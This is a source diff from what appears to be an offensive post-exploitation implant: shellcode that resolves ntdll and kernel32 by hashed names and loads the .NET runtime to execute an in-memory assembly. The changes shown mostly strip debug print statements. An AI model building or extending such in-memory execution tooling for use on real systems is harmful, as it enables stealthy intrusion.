@@ -16,8 +16,7 @@ auto declfn dotnet_exec(
     WCHAR* appdomain  = dotnet_args->appdomain;
     WCHAR* version    = dotnet_args->fmversion;
 
-    self->ntdll.DbgPrint("args : %ls\n", arguments);
-    self->ntdll.DbgPrint("appdm: %ls\n", appdomain);
+    self->ntdll.DbgPrint("dotnet init\n");
 
     struct {
         GUID CLRMetaHost;
@@ -78,7 +77,7 @@ auto declfn dotnet_exec(
 
     SECURITY_ATTRIBUTES secattr = { 0 };
 
-    auto dotnet_cleanup = [&]() {
+    auto dotnet_cleanup = [&]() -> HRESULT {
         if ( backup_pipe ) {
             self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, backup_pipe );
         }
@@ -310,14 +309,11 @@ declfn mself::mself( void ) {
     this->ctx.size  = size;
     this->ctx.heap  = NtCurrentPeb()->ProcessHeap;
 
-    this->ntdll.handle = load_module( hashstr("ntdll.dll") );
+    this->ntdll.handle    = load_module( hashstr("ntdll.dll") );
     this->kernel32.handle = load_module( hashstr("kernel32.dll") );
 
     rsl_imp( ntdll );
     rsl_imp( kernel32 );
-
-    this->ntdll.DbgPrint("shellcode: [%d] %p\n", this->ctx.size, this->ctx.start);
-    this->ntdll.DbgPrint("end ptr: %p\n", endptr());
 
     this->mscoree.handle  = (UPTR)this->kernel32.LoadLibraryA("mscoree.dll");
     this->oleaut32.handle = (UPTR)this->kernel32.LoadLibraryA("oleaut32.dll");
@@ -332,8 +328,6 @@ declfn mself::mself( void ) {
     parser::header( argbuff, &this->postex );
     parser::create( &psr, this->postex.args, this->postex.argc );
 
-    this->ntdll.DbgPrint("created\n");
-
     HRESULT result = S_OK;
 
     ULONG dotnet_threadid = 0;
@@ -344,12 +338,6 @@ declfn mself::mself( void ) {
 
     ULONG dotnetlen  = 0;
     PBYTE dotnetbuff = parser::bytes( &psr, &dotnetlen );
-
-    this->ntdll.DbgPrint("dotnet [%d] %p\n", dotnetlen, dotnetbuff);
-
-    this->ntdll.DbgPrint("appdomain %ls\n", appdomain);
-    this->ntdll.DbgPrint("arguments %ls\n", arguments);
-    this->ntdll.DbgPrint("fmversion %ls\n", fmversion);
 
     DOTNET_ARGS dotnet_args = {};
 
